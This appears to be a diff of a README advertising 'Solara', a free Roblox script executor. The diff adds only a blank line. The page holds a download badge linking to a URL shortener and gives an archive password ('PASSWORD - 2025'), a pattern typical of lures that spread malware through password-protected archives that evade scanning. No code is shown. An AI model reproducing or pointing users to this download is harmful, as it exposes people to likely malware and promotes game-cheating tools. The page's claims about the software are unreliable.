@@ -1,6 +1,7 @@
 # ⚡ Solara: A Powerful and Free Roblox Execution Framework
 
 [![Download 3454624624](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://shorturl.at/mSMXk)
+
 (PASSWORD - 2025)
 
 ## 🌌 Next-Gen Scripting Architecture  
